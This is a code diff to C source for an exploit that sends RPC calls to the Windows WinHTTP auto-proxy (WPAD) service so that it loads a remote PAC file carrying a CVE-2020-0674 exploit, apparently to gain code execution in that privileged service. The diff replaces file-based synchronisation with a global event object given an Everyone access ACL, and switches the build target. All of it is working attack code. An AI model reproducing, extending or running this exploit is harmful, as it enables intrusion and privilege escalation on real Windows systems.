@@ -16,11 +16,12 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <AclAPI.h>
 #include "IWinHttpAutoProxySvc_h.h"
 
 #pragma comment(lib, "rpcrt4.lib")
 
-BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
+BOOL SetObjectAclAllAccess(HANDLE hObject, wchar_t* SID, SE_OBJECT_TYPE ObjectType);
 
 ////////
 ////////
@@ -28,9 +29,9 @@ BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 ////////
 
 #define DEBUG
-//#define EXE_BUILD
-#define DLL_BUILD
-#define SHELLCODE_BUILD
+#define EXE_BUILD
+//#define DLL_BUILD
+//#define SHELLCODE_BUILD
 #define SPOOL_SYNC
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
 
@@ -219,6 +220,18 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
 #ifdef DEBUG
     DebugLog(L"... DllMain executed");
+    if (CreateEventW(NULL, TRUE, FALSE, L"Local\\DoubleStarEvent1")) {
+        DebugLog(L"... successfully created local double star event obj");
+    }
+    else {
+        DebugLog(L"... failed to create local double star event obj");
+    }
+    if (CreateEventW(NULL, TRUE, FALSE, L"Global\\DoubleStarEvent2")) {
+        DebugLog(L"... successfully created global double star event obj");
+    }
+    else {
+        DebugLog(L"... failed to create global double star event obj");
+    }
 #endif
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
@@ -347,41 +360,34 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
         4. Terminates itself.
         */
 #ifdef SPOOL_SYNC
-        if (CreateDirectoryW(SYNC_FOLDER, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
-            HANDLE hFile = CreateFileW(SYNC_FILE, GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);
+        HANDLE hEvent;
 
-            if (hFile != INVALID_HANDLE_VALUE) {
-                CloseHandle(hFile);
+        if ((hEvent = CreateEventW(NULL, TRUE, FALSE, L"Globaal\\DoubleStarEvent"))) {
+            if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
+                DebugLog(L"... successfully set Everyone ACL on event object");
 
-                if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
-                    DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
-
-                    while (TRUE) {
+                while (TRUE) {
 #endif
-                        DebugLog(L"... sending PAC update RPC signal to WPAD...");
-                        RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
-                        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+                    DebugLog(L"... sending PAC update RPC signal to WPAD...");
+                    RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
+                    DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
 #ifdef SPOOL_SYNC
-                        Sleep(3000);
-                        hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-
-                        if (hFile == INVALID_HANDLE_VALUE) {
-                            DebugLog(L"... received sync signal from code within WPAD");
-                            break;
-                        }
-                        else {
-                            CloseHandle(hFile);
-                            DebugLog(L"... timed out waiting on sync signal from code within WPAD");
-                        }
+                    if(WaitForSingleObject(hEvent, 2500) == WAIT_OBJECT_0) {
+                        DebugLog(L"... received sync signal from code within WPAD");
+                        break;
                     }
-                }
-                else {
-                    DebugLog(L"... failed to set Everyone ACL on file at %ws", SYNC_FILE);
+                    else {
+                        DebugLog(L"... timed out waiting on sync signal from code within WPAD");
+                    }
                 }
             }
             else {
-                DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
+                CloseHandle(hEvent);
+                DebugLog(L"... failed to set Everyone ACL on global event object");
             }
+        }
+        else {
+            DebugLog(L"... failed to create sync event");
         }
 #endif
     }
